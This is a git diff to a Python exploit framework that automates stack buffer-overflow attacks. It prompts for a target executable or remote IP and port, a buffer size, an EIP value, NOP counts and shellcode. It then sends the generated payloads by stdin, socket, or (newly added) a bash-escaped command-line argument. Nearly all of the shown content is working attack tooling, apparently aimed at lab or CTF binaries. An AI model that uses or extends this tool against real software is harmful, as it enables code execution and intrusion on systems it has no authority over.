@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+import binascii
 import argparse
 from itertools import product
 import select
@@ -10,6 +11,8 @@ import subprocess
 import platform
 import os
 
+# Looks weird here IOT satisfy pylint's "anomalous backslash" complaints.
+# Doesn't affect printing to console
 titlepage = \
     """
 ########################################################################################################
@@ -63,6 +66,8 @@ class exploit:
         self.target_os = None
         self.is_local = None
         self.target_exe = None
+        self.stdin_or_arg = None
+        self.trigger_arg = None
         self.target_ip = None
         self.target_port = None
         self.trigger_command = None
@@ -129,13 +134,23 @@ class exploit:
         print("\nI loaded the following settings:\n\n", self, sep="")
         input("\n\nPress ENTER to continue")
 
-    def get_trigger(self):
+    def get_trigger_cmd(self):
         response = get_input("\n#|| Do you need to prepend a specific command " +
                              "to trigger the vulnerability? (y/[n]):\n", ["y", "n", ""], default="n")
         if yn_key[response]:
             self.trigger_command = input("\n#|| Enter the command:\n").strip()
         else:
             self.trigger_command = "NA"
+
+    def get_trigger_arg(self):
+        response = get_input("\n#|| Do you need to include any switches or arguments " +
+                             "to trigger the vulnerability? (y/[n]):\n", ["y", "n", ""], default="n")
+        if yn_key[response]:
+            self.trigger_arg = input(
+                "\n#|| Enter everything needed (switches, args, etc.) between the executable " +
+                "name and the payload on the cmdline:\n").strip()
+        else:
+            self.trigger_arg = "NA"
 
     def get_buffer_size(self):
         """
@@ -353,8 +368,20 @@ class exploit:
             if self.target_exe == None:
                 self.target_exe = get_filepath(
                     "of your target", already_exists=True)
-            if self.trigger_command == None:
-                self.get_trigger()
+            if self.stdin_or_arg == None:
+                response = get_input(
+                    "#|| Does your target accept the payload through stdin or cmdline argument? " +
+                    "([s]/c):\n", ["s", "c", ""], default="s")
+                if response == "s":
+                    # Stdin
+                    self.stdin_or_arg = "stdin"
+                    if self.trigger_command == None:
+                        self.get_trigger_cmd()
+                elif response == "c":
+                    # Cmdline Arg
+                    self.stdin_or_arg = "arg"
+                    if self.trigger_arg == None:
+                        self.get_trigger_arg()
             if self.buffer_size == None:
                 self.get_buffer_size()
             self.get_target_eip()
@@ -362,6 +389,7 @@ class exploit:
                 self.get_nop_counts()
             if self.shellcode == None:
                 self.set_shellcode()
+
         else:
             # get info for remote buffer overflow exploits
             print(
@@ -388,7 +416,7 @@ class exploit:
                                          str(i) for i in range(65536)])
                     self.target_port = int(response)
                 if self.trigger_command == None:
-                    self.get_trigger()
+                    self.get_trigger_cmd()
                 if self.buffer_size == None:
                     self.get_buffer_size()
                 self.get_target_eip()
@@ -491,11 +519,31 @@ class exploit:
                             hex(int(eip, 16) + 8*num)).replace("0x", "")
                         self.payload_generator(buffer_size, current_eip)
                         if self.is_local:
-                            p = subprocess.Popen([cmd_string], stdin=subprocess.PIPE,
-                                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-                            out = p.communicate(input=self.payload)[0].decode()
-                            responses.append("".join(out.split("\n")[-2:]))
-                            print("\t[*] Sent!")
+                            if self.stdin_or_arg == "stdin":
+                                p = subprocess.Popen([cmd_string], stdin=subprocess.PIPE,
+                                                     stdout=subprocess.PIPE, 
+                                                     stderr=subprocess.STDOUT, shell=True)
+                                out = p.communicate(input=self.payload)[
+                                    0].decode()
+                                responses.append(list(filter(lambda a: a != "", out.split("\n")))[-1])
+                                print("\t[*] Sent!")
+                            elif self.stdin_or_arg == "arg" and self.local_os == "linux":
+                                string = binascii.hexlify(self.payload).decode()
+                                lit_string = r"\x".join([string[i:i+2] for i in range(0,len(string),2)])
+                                lit_string = r"$'\x" + lit_string + r"'"
+                                if self.trigger_arg == None or self.trigger_arg == "NA":
+                                    cmd = " ".join([cmd_string, lit_string])
+                                else:
+                                    cmd = " ".join([cmd_string, self.trigger_arg, lit_string])
+                                p = subprocess.Popen(["/bin/bash"], stdin=subprocess.PIPE,
+                                                     stdout=subprocess.PIPE, 
+                                                     stderr=subprocess.STDOUT, universal_newlines=True)
+                                out = p.communicate(input=cmd)[0]
+                                # Split on newline, filter null entries, append the last remaining line
+                                responses.append(list(filter(lambda a: a != "", out.split("\n")))[-1])
+                                print("\t[*] Sent!")
+                            else:
+                                print(missing)
                         else:
                             s = socket.socket(
                                 socket.AF_INET, socket.SOCK_STREAM)
